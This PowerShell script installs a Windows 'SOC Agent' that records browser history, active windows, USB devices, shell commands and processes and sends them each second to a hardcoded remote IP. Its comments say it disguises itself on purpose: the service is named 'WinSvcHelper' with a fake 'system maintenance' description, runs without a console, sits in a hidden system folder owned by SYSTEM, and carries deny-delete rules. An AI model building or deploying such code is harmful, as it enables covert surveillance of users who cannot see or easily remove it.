#Requires -RunAsAdministrator
# ============================================================
#  SOC Agent — Windows Installer (with failsafes)
#  Usage: .\install_service_windows.ps1
#         .\install_service_windows.ps1 -Uninstall
# ============================================================

param(
    [switch]$Uninstall
)

$ErrorActionPreference = "Stop"
$SERVICE_NAME = "WinSvcHelper"  # internal name — generic, does not reveal purpose
$INSTALL_DIR  = "C:\ProgramData\SocAgent"
$LOG_FILE     = "$INSTALL_DIR\install.log"
$MIN_DISK_MB  = 200
$SOURCE_ROOT  = Split-Path -Parent $PSScriptRoot   # parent of deploy/
$ROLLED_BACK  = $false

# ── Logging ───────────────────────────────────────────────────────────────────
function log {
    param([string]$Msg, [string]$Color = "White")
    $ts   = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts] $Msg"
    Write-Host $line -ForegroundColor $Color
    try { Add-Content -Path $LOG_FILE -Value $line -ErrorAction SilentlyContinue } catch {}
}

# ── Rollback ──────────────────────────────────────────────────────────────────
function Invoke-Rollback {
    if ($script:ROLLED_BACK) { return }
    $script:ROLLED_BACK = $true
    log "ERROR: Installation failed — rolling back..." "Red"
    try {
        $svc = Get-Service $SERVICE_NAME -ErrorAction SilentlyContinue
        if ($svc) {
            if ($svc.Status -eq "Running") { Stop-Service $SERVICE_NAME -Force -ErrorAction SilentlyContinue }
            $py = Find-Python
            $ss = "$INSTALL_DIR\agent\agent_service.py"
            if ($py -and (Test-Path $ss)) { & $py $ss remove 2>$null }
            else { sc.exe delete $SERVICE_NAME 2>$null | Out-Null }
        }
    } catch {}
    try {
        if (Test-Path $INSTALL_DIR) {
            attrib -h -s $INSTALL_DIR 2>$null
            Remove-Item -Recurse -Force $INSTALL_DIR -ErrorAction SilentlyContinue
        }
    } catch {}
    log "Rollback complete. Check above for the error." "Yellow"
}

# ── Helpers ───────────────────────────────────────────────────────────────────
function Find-Python {
    foreach ($cmd in @("python","python3")) {
        $p = Get-Command $cmd -ErrorAction SilentlyContinue
        if ($p) { return $p.Source }
    }
    foreach ($g in @(
        "$env:LOCALAPPDATA\Programs\Python\Python3*\python.exe",
        "$env:ProgramFiles\Python3*\python.exe",
        "C:\Python3*\python.exe"
    )) {
        $m = Get-ChildItem $g -ErrorAction SilentlyContinue | Sort-Object Name -Descending | Select-Object -First 1
        if ($m) { return $m.FullName }
    }
    return $null
}

function Find-Git {
    $g = Get-Command git -ErrorAction SilentlyContinue
    if ($g) { return $g.Source }
    foreach ($p in @("C:\Program Files\Git\cmd\git.exe","C:\Program Files (x86)\Git\cmd\git.exe")) {
        if (Test-Path $p) { return $p }
    }
    return $null
}

function Find-Pythonw {
    # Prefer pythonw.exe — runs silently with no console window
    $py = Find-Python
    if (-not $py) { return $null }
    $pythonw = Join-Path (Split-Path $py) "pythonw.exe"
    if (Test-Path $pythonw) { return $pythonw }
    return $py   # fallback: python.exe still works
}

# ═══════════════════════════════════════════════════════════════════════════════
#  UNINSTALL
# ═══════════════════════════════════════════════════════════════════════════════
if ($Uninstall) {
    New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null
    log "=== SOC Agent Uninstall ===" "Yellow"
    $svc = Get-Service $SERVICE_NAME -ErrorAction SilentlyContinue
    if ($svc) {
        if ($svc.Status -eq "Running") { Stop-Service $SERVICE_NAME -Force }
        $py = Find-Python; $ss = "$INSTALL_DIR\agent\agent_service.py"
        if ($py -and (Test-Path $ss)) { & $py $ss remove 2>$null }
        else { sc.exe delete $SERVICE_NAME | Out-Null }
        log "Service removed." "Green"
    }
    if (Test-Path $INSTALL_DIR) {
        # ── Lift all protection layers before deleting ──────────────────────
        log "    Removing deny-delete ACE..." "Yellow"
        icacls $INSTALL_DIR /remove:d "Everyone" /T /C /Q | Out-Null   # remove the Deny ACE
        icacls $INSTALL_DIR /reset /T /C /Q | Out-Null                  # reset to inherited ACLs
        attrib -h -s $INSTALL_DIR /S /D 2>$null | Out-Null              # un-hide + un-system
        Remove-Item -Recurse -Force $INSTALL_DIR
        log "Install directory removed." "Green"
    }
    log "SOC Agent fully uninstalled." "Green"
    exit 0
}


# ═══════════════════════════════════════════════════════════════════════════════
#  INSTALL
# ═══════════════════════════════════════════════════════════════════════════════

# ── Interactive configuration prompts ────────────────────────────────────────
Write-Host ""
Write-Host "════════════════════════════════════" -ForegroundColor Cyan
Write-Host "  SOC Agent — Configuration" -ForegroundColor Cyan
Write-Host "════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

# 1. Agent ID (required — no default)
$AGENT_ID = ""
while ([string]::IsNullOrWhiteSpace($AGENT_ID)) {
    $AGENT_ID = (Read-Host "Enter Agent ID (e.g. agent-lab-01)").Trim()
    if ([string]::IsNullOrWhiteSpace($AGENT_ID)) {
        Write-Host "  Agent ID cannot be empty. Please try again." -ForegroundColor Red
    }
}

# 2. Agent Hostname (default: system hostname)
$SYS_HOSTNAME = $env:COMPUTERNAME
$HostnameInput = (Read-Host "Enter Agent Hostname (e.g. LAB-PC-01) [$SYS_HOSTNAME]").Trim()
$MachineName = if ([string]::IsNullOrWhiteSpace($HostnameInput)) { $SYS_HOSTNAME } else { $HostnameInput }

# 3. Manager Host IP (default: 139.59.48.159)
$IPInput = (Read-Host "Enter Manager IP [139.59.48.159]").Trim()
$ManagerIp = if ([string]::IsNullOrWhiteSpace($IPInput)) { "139.59.48.159" } else { $IPInput }

# 4. Manager Port — hardcoded silently
$MANAGER_PORT = 9000

# ── Confirmation summary ──────────────────────────────────────────────────────
Write-Host ""
Write-Host " ─────────────────────────────────" -ForegroundColor Cyan
Write-Host "  Agent ID      : $AGENT_ID" -ForegroundColor White
Write-Host "  Hostname      : $MachineName" -ForegroundColor White
Write-Host "  Manager IP    : $ManagerIp" -ForegroundColor White
Write-Host "  Manager Port  : $MANAGER_PORT" -ForegroundColor White
Write-Host " ─────────────────────────────────" -ForegroundColor Cyan
Write-Host ""
$confirm = (Read-Host "Proceed with installation? [Y/n]").Trim()
if ($confirm -eq 'n' -or $confirm -eq 'N') {
    Write-Host "Installation aborted." -ForegroundColor Yellow
    exit 0
}
Write-Host ""

# Create install dir early so logging works
New-Item -ItemType Directory -Force -Path $INSTALL_DIR | Out-Null

log "══════════════════════════════════════════" "Cyan"
log "  SOC Agent — Windows Installer" "Cyan"
log "══════════════════════════════════════════" "Cyan"
log "Manager IP : $ManagerIp"
log "Agent ID   : $AGENT_ID"
log "Hostname   : $MachineName"
log "Install dir: $INSTALL_DIR"
log "Source     : $SOURCE_ROOT"

try {

# ── STEP 1: Disk space ────────────────────────────────────────────────────────
log "[1/10] Checking disk space..."
$drv   = (Split-Path -Qualifier $INSTALL_DIR) -replace ':',''
$disk  = Get-PSDrive $drv -ErrorAction SilentlyContinue
if ($disk) {
    $freeMB = [math]::Round($disk.Free / 1MB)
    if ($freeMB -lt $MIN_DISK_MB) { throw "Insufficient disk space: need ${MIN_DISK_MB}MB, have ${freeMB}MB." }
    log "    Free space: ${freeMB}MB ✓" "Green"
}

# ── STEP 2: Already installed? ────────────────────────────────────────────────
log "[2/10] Checking existing installation..."
$existSvc = Get-Service $SERVICE_NAME -ErrorAction SilentlyContinue
$existDir = Test-Path "$INSTALL_DIR\agent\agent.py"
if ($existSvc -or $existDir) {
    $r = Read-Host "    SOC Agent already installed. Reinstall? [y/N]"
    if ($r -notin @('y','Y')) { log "Skipping — existing install kept." "Yellow"; exit 0 }
    log "    Proceeding with reinstall..." "Yellow"
    if ($existSvc -and $existSvc.Status -eq "Running") { Stop-Service $SERVICE_NAME -Force -ErrorAction SilentlyContinue }
} else {
    log "    No existing installation." "Green"
}

# ── STEP 3: Python ────────────────────────────────────────────────────────────
log "[3/10] Checking Python..."
$python = Find-Python
if (-not $python) {
    log "    Python not found — installing via winget..." "Yellow"
    winget install --id Python.Python.3.12 -e --source winget --silent `
        --accept-package-agreements --accept-source-agreements 2>$null
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" +
                [System.Environment]::GetEnvironmentVariable("PATH","User")
    $python = Find-Python
    if (-not $python) { throw "Python install via winget failed. Install Python 3.8+ from https://python.org" }
    log "    Python installed." "Green"
}
log "    Python: $python" "Green"

# ── Git (needed for auto-update) ──────────────────────────────────────────────
$git = Find-Git
if (-not $git) {
    log "    Git not found — installing via winget..." "Yellow"
    winget install --id Git.Git -e --source winget --silent `
        --accept-package-agreements --accept-source-agreements 2>$null
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" +
                [System.Environment]::GetEnvironmentVariable("PATH","User")
    $git = Find-Git
    if (-not $git) { log "    WARNING: Git not found. Auto-update will be disabled." "Yellow" }
}
if ($git) { log "    Git: $git" "Green" }

# ── STEP 4: Copy files ────────────────────────────────────────────────────────
log "[4/10] Copying agent files to $INSTALL_DIR..."
foreach ($folder in @("agent","shared","database")) {
    $src = Join-Path $SOURCE_ROOT $folder
    if (Test-Path $src) {
        Copy-Item -Path $src -Destination $INSTALL_DIR -Recurse -Force
        log "    Copied: $folder\" "Green"
    } else {
        log "    WARNING: Source folder '$folder' not found — skipping." "Yellow"
    }
}
foreach ($file in @("requirements.txt")) {
    $src = Join-Path $SOURCE_ROOT $file
    if (Test-Path $src) {
        Copy-Item $src $INSTALL_DIR -Force
        log "    Copied: $file" "Green"
    }
}
# Write .env
@"
MANAGER_HOST=$ManagerIp
MANAGER_PORT=9000
AGENT_ID=$AGENT_ID
AGENT_HOSTNAME=$MachineName
AGENT_SEND_INTERVAL=1
MONITOR_BROWSER_HISTORY=true
MONITOR_ACTIVE_WINDOW=true
MONITOR_USB_DEVICES=true
MONITOR_SHELL_COMMANDS=true
MONITOR_PROCESSES=true
"@ | Set-Content "$INSTALL_DIR\.env" -Encoding UTF8
log "    Wrote: .env" "Green"

# ── STEP 5: pip dependencies ──────────────────────────────────────────────────
log "[5/10] Installing Python dependencies..."
& $python -m pip install -r "$INSTALL_DIR\requirements.txt" --quiet
if ($LASTEXITCODE -ne 0) { throw "pip install failed." }
log "    Dependencies installed." "Green"

# Compile .py → .pyc
& $python -m compileall $INSTALL_DIR -q
log "    .pyc compiled." "Green"

# ── STEP 6: Permissions ───────────────────────────────────────────────────────
log "[6/10] Applying access restrictions..."
attrib +h +s $INSTALL_DIR
$acl = Get-Acl $INSTALL_DIR
$acl.SetAccessRuleProtection($true, $false)
$acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    "SYSTEM","FullControl","ContainerInherit,ObjectInherit","None","Allow")))
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    "Administrators","FullControl","ContainerInherit,ObjectInherit","None","Allow")))
Set-Acl $INSTALL_DIR $acl
log "    ACL: SYSTEM + Administrators only | attrib: +h +s" "Green"

# ── Layer 2: Transfer ownership to SYSTEM ────────────────────────────────────
# Ensures no user-level admin account is listed as owner (owner can bypass ACLs)
log "    Transferring folder ownership to SYSTEM..."
takeown /F $INSTALL_DIR /R /A /D Y 2>&1 | Out-Null
icacls $INSTALL_DIR /setowner "SYSTEM" /T /C /Q | Out-Null
log "    Owner set to SYSTEM (recursive)." "Green"

# ── Layer 3: Deny-delete for Everyone (admin accident-proof) ─────────────────
# D  = delete the folder itself
# DC = delete child — prevents emptying/removing files inside
# Even Administrators cannot delete without first removing this Deny ACE.
log "    Applying delete-deny ACE for Everyone..."
icacls $INSTALL_DIR /deny "Everyone:(D,DC)" /T /C /Q | Out-Null
log "    Delete denied for Everyone (D + DC). Folder is tamper-resistant." "Green"

# ── STEP 7: Windows Service ───────────────────────────────────────────────────
log "[7/10] Registering Windows Service '$SERVICE_NAME'..."
$pythonw = Find-Pythonw
if (-not $pythonw) { throw "Python not found for service registration." }

& $pythonw -c "import win32serviceutil" 2>$null
if ($LASTEXITCODE -ne 0) {
    & $pythonw -m pip install pywin32 --quiet
    $post = Join-Path (Split-Path $pythonw) "Scripts\pywin32_postinstall.py"
    if (Test-Path $post) { & $pythonw $post -install 2>$null }
}
$svcScript = "$INSTALL_DIR\agent\agent_service.py"
if (-not (Test-Path $svcScript)) { throw "agent_service.py not found at $svcScript" }

$old = Get-Service $SERVICE_NAME -ErrorAction SilentlyContinue
if ($old) {
    if ($old.Status -eq "Running") { Stop-Service $SERVICE_NAME -Force }
    & $pythonw $svcScript remove 2>$null
    Start-Sleep -Seconds 1
}
# Install using pythonw.exe — no console window spawned
& $pythonw $svcScript install
if ($LASTEXITCODE -ne 0) { throw "Service install failed." }
sc.exe config      $SERVICE_NAME start= auto | Out-Null
# Generic description — does not reveal monitoring purpose
sc.exe description $SERVICE_NAME "Provides background system maintenance services." | Out-Null
sc.exe failure     $SERVICE_NAME reset= 86400 actions= restart/5000/restart/5000/restart/5000 | Out-Null
Start-Service $SERVICE_NAME
log "    Service registered (pythonw.exe, no console) and started." "Green"

# ── STEP 8: Manager connectivity ─────────────────────────────────────────────
log "[8/10] Checking manager connectivity ($ManagerIp`:9000)..."
$conn = Test-NetConnection -ComputerName $ManagerIp -Port 9000 `
        -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
if ($conn.TcpTestSucceeded) {
    log "    Manager reachable ✓" "Green"
} else {
    log "    WARNING: $ManagerIp`:9000 not reachable. Agent will retry automatically." "Yellow"
}

# ── STEP 9: Log install complete ──────────────────────────────────────────────
log "[9/10] Writing install summary..."
log "    Agent ID  : $AGENT_ID"
log "    Manager   : ${ManagerIp}:9000"
log "    Install   : $INSTALL_DIR"
log "    Service   : $SERVICE_NAME (Automatic)"

# ── STEP 10: Verify ───────────────────────────────────────────────────────────
log "[10/10] Verifying..."
Start-Sleep -Seconds 2
sc.exe query $SERVICE_NAME | ForEach-Object { log "    $_" }
$svc = Get-Service $SERVICE_NAME -ErrorAction SilentlyContinue
if ($svc -and $svc.Status -eq "Running") {
    log "✅ SOC Agent RUNNING | Auto-start: ON | Path: $INSTALL_DIR" "Green"
} else {
    log "⚠️  Service installed but not running. Check Event Viewer." "Yellow"
}

log "Install log saved to: $LOG_FILE"
log "Commands: sc query $SERVICE_NAME | Stop-Service $SERVICE_NAME (Admin)"

} catch {
    log "FATAL: $_" "Red"
    Invoke-Rollback
    exit 1
}
